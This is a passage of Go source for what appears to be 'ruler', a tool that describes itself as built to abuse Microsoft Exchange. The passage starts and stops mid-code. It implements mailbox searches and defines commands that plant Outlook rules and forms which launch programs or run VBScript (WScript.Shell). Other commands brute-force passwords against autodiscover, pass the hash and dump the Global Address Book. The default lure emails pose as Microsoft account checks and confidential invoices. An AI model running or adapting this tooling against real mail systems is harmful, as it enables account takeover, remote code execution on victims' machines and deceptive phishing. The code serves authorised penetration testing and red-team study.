utils.FromUnicode(rows.RowData[k][0].ValueArray) == \"xyz\" {\n\t\t\t\tFolderID = rows.RowData[k][1].ValueArray\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t}\n\tif _, er := mapi.DeleteFolder(folderid, FolderID); er != nil {\n\t\tutils.Warning.Println(\"Failed to delete trigger. Should be fine though.\")\n\t}\n\n\treturn nil\n}\n\nfunc searchFolders(c *cli.Context) error {\n\tutils.Info.Println(\"Checking if a search folder exists\")\n\n\tsearchFolderName := \"searcher\"\n\n\tsearchFolder, err := checkFolder(searchFolderName)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Unable to create a search folder to use. %s\", err)\n\t}\n\n\tutils.Info.Println(\"Setting search criteria\")\n\n\tfolderids := mapi.AuthSession.Folderids[mapi.INBOX]\n\n\t//create the search criteria restrictions\n\n\trestrict := mapi.AndRestriction{RestrictType: 0x00}\n\trestrict.RestrictCount = uint16(2)\n\n\t//var orRestrict mapi.OrRestriction\n\n\t//restrict by subject or PidTagBody\n\trestrictContent := mapi.ContentRestriction{RestrictType: 0x03}\n\trestrictContent.FuzzyLevelLow = mapi.FLSUBSTRING\n\trestrictContent.FuzzyLevelHigh = mapi.FLIGNORECASE\n\tif c.Bool(\"subject\") == true {\n\t\trestrictContent.PropertyTag = mapi.PidTagSubject\n\t} else {\n\t\trestrictContent.PropertyTag = mapi.PidTagBody\n\t}\n\n\trestrictContent.PropertyValue = mapi.TaggedPropertyValue{PropertyTag: restrictContent.PropertyTag, PropertyValue: utils.UniString(c.String(\"term\"))}\n\n\t//Restrict to IPM.Note\n\trestrictMsgClass := mapi.ContentRestriction{RestrictType: 0x03}\n\trestrictMsgClass.FuzzyLevelLow = mapi.FLPREFIX\n\trestrictMsgClass.FuzzyLevelHigh = mapi.FLIGNORECASE\n\trestrictMsgClass.PropertyTag = mapi.PidTagMessageClass\n\trestrictMsgClass.PropertyValue = mapi.TaggedPropertyValue{PropertyTag: restrictMsgClass.PropertyTag, PropertyValue: utils.UniString(\"IPM.Note\")}\n\n\trestrict.Restricts = []mapi.Restriction{restrictContent, restrictMsgClass}\n\t/*\n\t\tif c.Bool(\"subject\") == true {\n\t\t\trestrict.Restricts = []mapi.Restriction{restrictContent, restrictMsgClass}\n\t\t} else {\n\t\t\torRestrict = mapi.OrRestriction{RestrictType: 0x01}\n\t\t\torRestrict.RestrictCount = uint16(2)\n\t\t\torRestrict.Restricts = []mapi.Restriction{restrictContent, restrictHTML}\n\t\t\trestrict.Restricts = []mapi.Restriction{orRestrict, restrictMsgClass}\n\t\t}\n\t*/\n\tif _, err := mapi.SetSearchCriteria(folderids, searchFolder, restrict); err != nil {\n\t\treturn fmt.Errorf(\"Unable to set search criteria: %s\", err)\n\t}\n\n\tutils.Info.Println(\"Waiting for search folder to populate\")\n\tfor x := 0; x < 1; x++ {\n\t\t//\ttime.Sleep(time.Second * (time.Duration)(5))\n\t\tres, _ := mapi.GetSearchCriteria(searchFolder)\n\t\t//do check if search is complete\n\t\t//fmt.Printf(\"Search Flag: %x\\n\", res.SearchFlags)\n\t\tif res.SearchFlags == 0x00001000 {\n\t\t\tbreak\n\t\t}\n\t}\n\tmapi.GetFolderFromID(searchFolder, nil)\n\n\trows, err := mapi.GetContents(searchFolder)\n\n\tif rows == nil {\n\t\tutils.Info.Println(\"No results returned\")\n\t\treturn nil\n\t}\n\n\tfor k := 0; k < len(rows.RowData); k++ {\n\t\tmessageSubject := utils.FromUnicode(rows.RowData[k][0].ValueArray)\n\t\tmessageid := rows.RowData[k][1].ValueArray\n\t\tcolumns := make([]mapi.PropertyTag, 1)\n\t\tcolumns[0] = mapi.PidTagBody //Column for the Message Body containing our payload\n\n\t\tbuff, err := mapi.GetMessageFast(searchFolder, messageid, columns)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t//convert buffer to rows\n\n\t\tmessagerows := mapi.DecodeBufferToRows(buff.TransferBuffer, columns)\n\t\tpayload := \"\"\n\t\tif len(messagerows[0].ValueArray) > 4 {\n\t\t\tpayload = utils.FromUnicode(messagerows[0].ValueArray[:len(messagerows[0].ValueArray)-4])\n\t\t}\n\t\tutils.Info.Printf(\"Subject: %s\\nBody: %s\\n\", messageSubject, payload)\n\n\t}\n\n\treturn nil\n}\n\nfunc checkFolder(folderName string) ([]byte, error) {\n\tvar folderID []byte\n\tpropertyTags := make([]mapi.PropertyTag, 2)\n\tpropertyTags[0] = mapi.PidTagDisplayName\n\tpropertyTags[1] = mapi.PidTagSubfolders\n\n\trows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])\n\n\tif er == nil {\n\t\tfor k := 0; k < len(rows.RowData); k++ {\n\t\t\t//convert string from unicode and then check if it is our target folder\n\t\t\tif utils.FromUnicode(rows.RowData[k][0].ValueArray) == folderName {\n\t\t\t\tfolderID = rows.RowData[k][1].ValueArray\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t}\n\n\tif len(folderID) == 0 {\n\t\tutils.Info.Println(\"No 'ruler' search folder exists. Creating one to use\")\n\t\t_, err := mapi.CreateSearchFolder(folderName)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\n\t\ttime.Sleep(time.Second * (time.Duration)(5))\n\n\t\trows, er = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])\n\t\tif er != nil || rows != nil {\n\t\t\tfor k := 0; k < len(rows.RowData); k++ {\n\t\t\t\t//convert string from unicode and then check if it is our target folder\n\t\t\t\tif utils.FromUnicode(rows.RowData[k][0].ValueArray) == folderName {\n\t\t\t\t\tfolderID = rows.RowData[k][1].ValueArray\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn nil, er\n\t\t}\n\t}\n\n\treturn folderID, nil\n}\n\nfunc checkLastSent() error {\n\t//This gets the \"Sent Items\" folder and grabs the last sent message.\n\t//Using the ClientInfo tag, we check who if this message was sent from Outlook or OWA\n\n\t//get the PropTag for ClientInfo\n\tfolderid := mapi.AuthSession.Folderids[mapi.SENT]\n\trows, err := mapi.GetContents(folderid)\n\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tif rows == nil {\n\t\treturn fmt.Errorf(\"Sent folder is empty\")\n\t}\n\t//get most recent message\n\tmessageid := rows.RowData[0][1].ValueArray\n\n\t//for some reason getting named property tags isn't working for me. Maybe I'm an idiot\n\t//so lets simply grab all tags. And then filter until we find one that starts with Client=\n\tbuff, err := mapi.GetPropertyIdsList(folderid, messageid)\n\n\tvar props []byte\n\tidcount := 0\n\tfor _, prop := range buff.PropertyTags {\n\t\tprops = append(props, utils.EncodeNum(prop.PropertyID)...)\n\t\tidcount++\n\t}\n\n\tpropNames, e := mapi.GetPropertyNamesFromID(folderid, messageid, props, idcount)\n\n\tif e != nil {\n\t\treturn e\n\t}\n\n\tvar getProps []mapi.PropertyTag\n\tvar clientPropID uint16\n\tvar clientIPPropID uint16\n\tvar serverIPPropID uint16\n\n\tfor i, p := range propNames.PropertyNames {\n\t\tif p.Kind == 0x01 {\n\t\t\tpName := utils.FromUnicode(p.Name)\n\t\t\tif pName == \"ClientInfo\" {\n\t\t\t\tgetProps = append(getProps, buff.PropertyTags[i])\n\t\t\t\tclientPropID = buff.PropertyTags[i].PropertyID\n\t\t\t} else if pName == \"x-ms-exchange-organization-originalclientipaddress\" {\n\t\t\t\tgetProps = append(getProps, buff.PropertyTags[i])\n\t\t\t\tclientIPPropID = buff.PropertyTags[i].PropertyID\n\t\t\t} else if pName == \"x-ms-exchange-organization-originalserveripaddress\" {\n\t\t\t\tgetProps = append(getProps, buff.PropertyTags[i])\n\t\t\t\tserverIPPropID = buff.PropertyTags[i].PropertyID\n\t\t\t}\n\t\t} else {\n\t\t\tif buff.PropertyTags[i].PropertyID == 0x0039 {\n\t\t\t\tgetProps = append(getProps, buff.PropertyTags[i])\n\t\t\t}\n\t\t}\n\n\t}\n\tmessageProps, err := mapi.GetMessage(folderid, messageid, getProps)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tfor _, row := range messageProps.GetData() {\n\n\t\tid := utils.DecodeUint16(row.PropID)\n\t\tswitch id {\n\t\tcase 0x0039:\n\t\t\tt := (utils.DecodeUint64(row.ValueArray) - 116444736000000000) * 100\n\t\t\tx := time.Unix(0, int64(t))\n\t\t\tutils.Info.Printf(\"Last Message sent at: %s \\n\", x.UTC())\n\t\tcase clientPropID:\n\t\t\tclstring := utils.FromUnicode(row.ValueArray)\n\t\t\tif clstring[6:9] == \"OWA\" {\n\t\t\t\tutils.Warning.Printf(\"Last message sent from OWA! User-Agent: %s\\n\", clstring[10:])\n\t\t\t} else {\n\t\t\t\tutils.Info.Printf(\"Last message sent from: %s\\n\", clstring[6:])\n\t\t\t}\n\t\tcase clientIPPropID:\n\t\t\tutils.Info.Printf(\"Client IP Address: %s\\n\", utils.FromUnicode(row.ValueArray))\n\t\tcase serverIPPropID:\n\t\t\tutils.Info.Printf(\"Exchange Server IP: %s\\n\", utils.FromUnicode(row.ValueArray))\n\t\t}\n\t}\n\treturn nil\n}\n\nfunc main() {\n\n\tapp := cli.NewApp()\n\n\tapp.Name = \"ruler\"\n\tapp.Usage = \"A tool to abuse Exchange Services\"\n\tapp.Version = \"2.4.0\"\n\tapp.Authors = []cli.Author{\n\t\tcli.Author{\n\t\t\tName:  \"Etienne Stalmans\",\n\t\t\tEmail: \"@_staaldraad\",\n\t\t},\n\t\tcli.Author{\n\t\t\tName:  \"Roman Maksimov\",\n\t\t\tEmail: \"@rmaksimov\",\n\t\t},\n\t}\n\tapp.Description = `         _\n _ __ _   _| | ___ _ __\n| '__| | | | |/ _ \\ '__|\n| |  | |_| | |  __/ |\n|_|   \\__,_|_|\\___|_|\n\nA tool by @_staaldraad and @sensepost to abuse Exchange Services.\n`\n\n\tapp.Flags = []cli.Flag{\n\t\tcli.StringFlag{\n\t\t\tName:  \"domain,d\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"A domain for the user (optional in most cases. Otherwise allows: domain\\\\username)\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"o365\",\n\t\t\tUsage: \"We know the target is on Office365, so authenticate directly against that.\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"username,u\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"A valid username\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"password,p\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"A valid password\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"hash\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"A NT hash for pass the hash\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"email,e\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"The target's email address\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"cookie\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"Any third party cookies such as SSO that are needed\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"config\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"The path to a config file to use\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"url\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"proxy\",\n\t\t\tValue: \"\",\n\t\t\tUsage: \"If you need to use an upstream proxy. Works with https://user:pass@ip:port or https://ip:port\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"useragent,ua\",\n\t\t\tValue: \"ruler\",\n\t\t\tUsage: \"Custom User-Agent string\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"insecure,k\",\n\t\t\tUsage: \"Ignore server SSL certificate errors\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"noencrypt\",\n\t\t\tUsage: \"Don't use encryption the RPC level - some environments require this\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"basic,b\",\n\t\t\tUsage: \"Force Basic authentication\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"admin\",\n\t\t\tUsage: \"Login as an admin\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"nocache\",\n\t\t\tUsage: \"Don't use the cached autodiscover record\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"rpc\",\n\t\t\tUsage: \"Force RPC/HTTP rather than MAPI/HTTP\",\n\t\t},\n\t\tcli.StringFlag{\n\t\t\tName:  \"hostname,n\",\n\t\t\tValue: \"RULER\",\n\t\t\tUsage: \"Custom Hostname value\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"verbose\",\n\t\t\tUsage: \"Be verbose and show some of the inner workings\",\n\t\t},\n\t\tcli.BoolFlag{\n\t\t\tName:  \"debug\",\n\t\t\tUsage: \"Be print debug info\",\n\t\t},\n\t}\n\n\tapp.Before = func(c *cli.Context) error {\n\t\tif c.Bool(\"verbose\") == true && c.Bool(\"debug\") == false {\n\t\t\tutils.Init(os.Stdout, os.Stdout, io.Discard, os.Stderr)\n\t\t} else if c.Bool(\"verbose\") == false && c.Bool(\"debug\") == true {\n\t\t\tutils.Init(io.Discard, os.Stdout, os.Stdout, os.Stderr)\n\t\t} else if c.Bool(\"debug\") == true {\n\t\t\tutils.Init(os.Stdout, os.Stdout, os.Stdout, os.Stderr)\n\t\t} else {\n\t\t\tutils.Init(io.Discard, os.Stdout, io.Discard, os.Stderr)\n\t\t}\n\t\treturn nil\n\t}\n\n\tapp.Commands = []cli.Command{\n\t\t{\n\t\t\tName:    \"add\",\n\t\t\tAliases: []string{\"a\"},\n\t\t\tUsage:   \"add a new rule\",\n\t\t\tFlags: []cli.Flag{\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"name,n\",\n\t\t\t\t\tValue: \"Delete Spam\",\n\t\t\t\t\tUsage: \"A name for our rule\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"trigger,t\",\n\t\t\t\t\tValue: \"Hey John\",\n\t\t\t\t\tUsage: \"A trigger word or phrase - this is going to be the subject of our trigger email\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"location,l\",\n\t\t\t\t\tValue: \"C:\\\\Windows\\\\System32\\\\calc.exe\",\n\t\t\t\t\tUsage: \"The location of our application to launch. Typically a WEBDAV URI\",\n\t\t\t\t},\n\t\t\t\tcli.BoolFlag{\n\t\t\t\t\tName:  \"send,s\",\n\t\t\t\t\tUsage: \"Trigger the rule by sending an email to the target\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"body,b\",\n\t\t\t\t\tValue: \"**Automated account check - please ignore**\\r\\n\\r\\nMicrosoft Exchange has run an automated test on your account.\\r\\nEverything seems to be configured correctly.\",\n\t\t\t\t\tUsage: \"The email body you may wish to use\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"subject\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"The subject you wish to use, this should contain your trigger word.\",\n\t\t\t\t},\n\t\t\t},\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t//check that name, trigger and location were supplied\n\t\t\t\tif c.String(\"name\") == \"\" || c.String(\"trigger\") == \"\" || c.String(\"location\") == \"\" {\n\t\t\t\t\tcli.NewExitError(\"Missing rule item. Use --name, --trigger and --location\", 1)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\n\t\t\t\terr := connect(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\t\t\t\terr = addRule(c)\n\t\t\t\texit(err)\n\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:    \"delete\",\n\t\t\tAliases: []string{\"r\"},\n\t\t\tUsage:   \"delete an existing rule\",\n\t\t\tFlags: []cli.Flag{\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"id\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"The ID of the rule to delete\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"name\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"The name of the rule to delete\",\n\t\t\t\t},\n\t\t\t},\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t//check that ID was supplied\n\t\t\t\tif c.String(\"id\") == \"\" && c.String(\"name\") == \"\" {\n\t\t\t\t\treturn cli.NewExitError(\"Rule id or name required. Use --id or --name\", 1)\n\t\t\t\t}\n\t\t\t\terr := connect(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\t\t\t\terr = deleteRule(c)\n\n\t\t\t\texit(err)\n\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:    \"display\",\n\t\t\tAliases: []string{\"d\"},\n\t\t\tUsage:   \"display all existing rules\",\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\terr := connect(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\t\t\t\terr = displayRules(c)\n\t\t\t\texit(err)\n\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:    \"check\",\n\t\t\tAliases: []string{\"c\"},\n\t\t\tUsage:   \"Check if the credentials work and we can interact with the mailbox\",\n\t\t\tFlags: []cli.Flag{\n\t\t\t\tcli.BoolFlag{\n\t\t\t\t\tName:  \"last\",\n\t\t\t\t\tUsage: \"Returns information about the last client used to send an email\",\n\t\t\t\t},\n\t\t\t},\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\terr := connect(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\n\t\t\t\tutils.Info.Println(\"Looks like we are good to go!\")\n\n\t\t\t\tif c.Bool(\"last\") == true {\n\t\t\t\t\terr = checkLastSent()\n\t\t\t\t}\n\t\t\t\texit(err)\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:    \"send\",\n\t\t\tAliases: []string{\"s\"},\n\t\t\tUsage:   \"Send an email to trigger an existing rule. This uses the target user's own account.\",\n\t\t\tFlags: []cli.Flag{\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"subject,s\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"A subject to use, this should contain our trigger word\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"body,b\",\n\t\t\t\t\tValue: \"**Automated account check - please ignore**\\r\\nMicrosoft Exchange has run an automated test on your account.\\r\\nEverything seems to be configured correctly.\",\n\t\t\t\t\tUsage: \"The email body you may wish to use\",\n\t\t\t\t},\n\t\t\t},\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t//check that trigger word was supplied\n\t\t\t\tif c.String(\"subject\") == \"\" {\n\t\t\t\t\treturn cli.NewExitError(\"The subject is required. Use --subject\", 1)\n\t\t\t\t}\n\t\t\t\terr := connect(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\t\t\t\terr = sendMessage(c.String(\"subject\"), c.String(\"body\"))\n\t\t\t\texit(err)\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:    \"autodiscover\",\n\t\t\tAliases: []string{\"u\"},\n\t\t\tUsage:   \"Just run the autodiscover service to find the authentication point\",\n\t\t\tFlags: []cli.Flag{\n\t\t\t\tcli.BoolFlag{\n\t\t\t\t\tName:  \"dump,d\",\n\t\t\t\t\tUsage: \"Dump the autodiscover record to a text file (this needs credentails)\",\n\t\t\t\t},\n\t\t\t\tcli.BoolFlag{\n\t\t\t\t\tName:  \"mapi,m\",\n\t\t\t\t\tUsage: \"Dump the MAPI version of the autodiscover record\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"out,o\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"The file to write to\",\n\t\t\t\t},\n\t\t\t},\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\terr := discover(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:    \"brute\",\n\t\t\tAliases: []string{\"b\"},\n\t\t\tUsage:   \"Do a bruteforce attack against the autodiscover service to find valid username/passwords\",\n\t\t\tFlags: []cli.Flag{\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"users,u\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"Filename for a username list (one name per line)\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"passwords,p\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"Filename for a password list (one password per line)\",\n\t\t\t\t},\n\t\t\t\tcli.StringFlag{\n\t\t\t\t\tName:  \"userpass\",\n\t\t\t\t\tValue: \"\",\n\t\t\t\t\tUsage: \"Filename for a username:password list (one per line)\",\n\t\t\t\t},\n\t\t\t\tcli.IntFlag{\n\t\t\t\t\tName:  \"attempts,a\",\n\t\t\t\t\tValue: 3,\n\t\t\t\t\tUsage: \"Number of attempts before delay\",\n\t\t\t\t},\n\t\t\t\tcli.IntFlag{\n\t\t\t\t\tName:  \"threads,t\",\n\t\t\t\t\tValue: 3,\n\t\t\t\t\tUsage: \"Number of concurrent attempts. Reduce if mutex issues appear.\",\n\t\t\t\t},\n\t\t\t\tcli.IntFlag{\n\t\t\t\t\tName:  \"delay,d\",\n\t\t\t\t\tValue: 5,\n\t\t\t\t\tUsage: \"Number of minutes to delay between attempts\",\n\t\t\t\t},\n\t\t\t\tcli.BoolFlag{\n\t\t\t\t\tName:  \"stop,s\",\n\t\t\t\t\tUsage: \"Stop on success\",\n\t\t\t\t},\n\t\t\t\tcli.BoolFlag{\n\t\t\t\t\tName:  \"verbose,v\",\n\t\t\t\t\tUsage: \"Display each attempt\",\n\t\t\t\t},\n\t\t\t},\n\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\terr := brute(c)\n\t\t\t\tif err != nil {\n\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t}\n\t\t\t\treturn nil\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:  \"abk\",\n\t\t\tUsage: \"Interact with the Global Address Book\",\n\t\t\tSubcommands: []cli.Command{\n\t\t\t\t{\n\t\t\t\t\tName:  \"list\",\n\t\t\t\t\tUsage: \"list the entries of the GAL\",\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = abkList(c)\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\tName:  \"dump\",\n\t\t\t\t\tUsage: \"dump the entries of the GAL and save to local file\",\n\t\t\t\t\tFlags: []cli.Flag{\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"output,o\",\n\t\t\t\t\t\t\tValue: \"\",\n\t\t\t\t\t\t\tUsage: \"File to save the GAL to\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t\t\tif c.String(\"output\") == \"\" {\n\t\t\t\t\t\t\treturn cli.NewExitError(\"The file to save to is required. Use --output or -o\", 1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = abkDump(c)\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t\t{\n\t\t\tName:  \"form\",\n\t\t\tUsage: \"Interact with the forms function.\",\n\t\t\tSubcommands: []cli.Command{\n\t\t\t\t{\n\t\t\t\t\tName:  \"add\",\n\t\t\t\t\tUsage: \"creates a new form. \",\n\t\t\t\t\tFlags: []cli.Flag{\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"suffix\",\n\t\t\t\t\t\t\tValue: \"pew\",\n\t\t\t\t\t\t\tUsage: \"A 3 character suffix for the form. Defaults to pew\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"command,c\",\n\t\t\t\t\t\t\tValue: \"\",\n\t\t\t\t\t\t\tUsage: \"The command to execute.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"input,i\",\n\t\t\t\t\t\t\tValue: \"\",\n\t\t\t\t\t\t\tUsage: \"A path to a file containing the command to execute. This takes precidence over 'command'\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.BoolFlag{\n\t\t\t\t\t\t\tName:  \"send,s\",\n\t\t\t\t\t\t\tUsage: \"Trigger the form once it's been created.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.BoolFlag{\n\t\t\t\t\t\t\tName:  \"raw\",\n\t\t\t\t\t\t\tUsage: \"Use a blank template allowing Raw VBScript.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.BoolFlag{\n\t\t\t\t\t\t\tName:  \"rule,r\",\n\t\t\t\t\t\t\tUsage: \"Trigger the form with a rule. This will add a new rule!\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"body,b\",\n\t\t\t\t\t\t\tValue: \"This message cannot be displayed in the previewer.\\n\\n\\n\\n\\n\",\n\t\t\t\t\t\t\tUsage: \"The email body you may wish to use\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"subject\",\n\t\t\t\t\t\t\tValue: \"Invoice [Confidential]\",\n\t\t\t\t\t\t\tUsage: \"The subject you wish to use, this should contain your trigger word.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t\t\tif c.String(\"suffix\") == \"\" {\n\t\t\t\t\t\t\treturn cli.NewExitError(\"The suffix is needs to be set.\", 1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif c.String(\"command\") == \"\" && c.String(\"input\") == \"\" {\n\t\t\t\t\t\t\tutils.Error.Println(\"Please supply a valid command.\\nSample:\\nCreateObject(\\\"WScript.Shell\\\").Run \\\"calc.exe\\\", 0, False\")\n\t\t\t\t\t\t\treturn cli.NewExitError(\"No command supplied\", 1)\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\terr := connect(c)\n\t\t\t\t\t\tif err != nil {\n\t\t\t\t\t\t\tutils.Error.Println(err)\n\t\t\t\t\t\t\tcli.OsExiter(1)\n\t\t\t\t\t\t}\n\t\t\t\t\t\terr = createForm(c)\n\t\t\t\t\t\texit(err)\n\t\t\t\t\t\treturn nil\n\t\t\t\t\t},\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\tName:  \"send\",\n\t\t\t\t\tUsage: \"send an email to an existing form and trigger it\",\n\t\t\t\t\tFlags: []cli.Flag{\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"suffix,s\",\n\t\t\t\t\t\t\tValue: \"\",\n\t\t\t\t\t\t\tUsage: \"The suffix used when creating the form. This must be the same as the value used when the form was created.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"body,b\",\n\t\t\t\t\t\t\tValue: \"This message cannot be displayed in the previewer.\\n\\n\\n\\n\\n\",\n\t\t\t\t\t\t\tUsage: \"The email body you may wish to use\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"subject\",\n\t\t\t\t\t\t\tValue: \"Invoice [Confidential]\",\n\t\t\t\t\t\t\tUsage: \"The subject you wish to use, this should contain your trigger word.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t\tcli.StringFlag{\n\t\t\t\t\t\t\tName:  \"target\",\n\t\t\t\t\t\t\tValue: \"\",\n\t\t\t\t\t\t\tUsage: \"Send the email to another account.\",\n\t\t\t\t\t\t},\n\t\t\t\t\t},\n\t\t\t\t\tAction: func(c *cli.Context) error {\n\t\t\t\t\t\tif c.String(\"suffix\") == \"\" {\n\t\t\t\t\t\t\treturn cli.NewExitError(\"The suffix is required. Please use the same value as supplied to the 'add' command. Default is pew\", 1)\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\terr := 